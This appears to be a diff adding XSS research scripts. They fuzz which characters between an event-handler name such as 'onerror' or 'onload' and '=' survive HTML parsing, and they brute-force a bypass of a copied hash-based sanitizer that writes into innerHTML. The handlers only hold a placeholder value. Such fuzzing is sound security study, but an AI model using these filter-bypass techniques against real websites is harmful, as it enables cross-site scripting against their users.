@@ -1,0 +1,70 @@
+<script>
+div = document.createElement('div');
+for(i=0; i <= 0xe280a8; i++){
+  div.innerHTML = '<img src=\"x\" onerror'+String.fromCharCode(i)+'=aaa>';
+
+  if(div.querySelector('img') && div.querySelector('img').getAttribute("onerror") === 'aaa'){
+    console.log(i.toString(16)+": " + div.innerHTML)
+  }
+}
+console.log("finished")
+</script>
+
+<script>
+div = document.createElement('div');
+for(i=0; i <= 0x10ffff; i++){
+  div.innerHTML = '<img src=\"x\" onerror'+String.fromCharCode(i)+'=aaa>';
+
+  if(div.querySelector('img') && div.querySelector('img').getAttribute("onerror") === 'aaa'){
+    console.log(i.toString(16));
+    //console.log(i+": " + div.innerHTML + " made from: " + i.toString(16))
+  }
+}
+console.log("finished")
+</script>
+<!-- 
+p = location.hash.substr(1)
+console.clear();
+console.log("Original: " +p);
+p=decodeURI(p);
+console.log("Decoded: " +p);
+p=p.replace(/[\x00-\x27\x2a-\x2d\x2f-\x3c\x3e-\x40\x5b-\x60\x7b-\x7f]+/g,"");
+console.log("1: " +p);
+p=p.replace(/[\u2028\u2029]+/g,"");
+console.log("2: " +p);
+try{
+  if((p.match(/=/g).length)>1 || p.match(/[()]/g).length>2)
+    p=":("
+}catch{}
+p=p.replace(/(on\w+)=(\w+)/ig,"");
+console.log("DELIVER: " + p);
+result.innerHTML="<img src=x "+p+">";
+ta.innerText=p;
+console.log("FINAL: " + result.innerHTML);
+ -->
+var front = "onload";
+var back = "=aaa";
+var mid = 0;
+var p = "";
+while(1){
+  if ((mid % 10000) == 0){console.log("Still alive...")}
+  p = front + String.fromCharCode(mid) + back;
+  try{
+    p=decodeURI(p);
+    p=p.replace(/[\x00-\x27\x2a-\x2d\x2f-\x3c\x3e-\x40\x5b-\x60\x7b-\x7f]+/g,"");
+    p=p.replace(/[\u2028\u2029]+/g,"");
+    try{
+      if((p.match(/=/g).length)>1 || p.match(/[()]/g).length>2)
+        p=":("
+    }catch{}
+    p=p.replace(/(on\w+)=(\w+)/ig,"");
+    result.innerHTML="<img src=x "+p+">";
+  }catch{}
+
+  if(result.querySelector('img') && result.querySelector('img').getAttribute("onload") === 'aaa'){
+    console.log(p.toString(16)+": " + result.innerHTML + " made from the integer: " + mid);
+    break;
+  }
+  mid++;
+}
+console.log("ENDED")
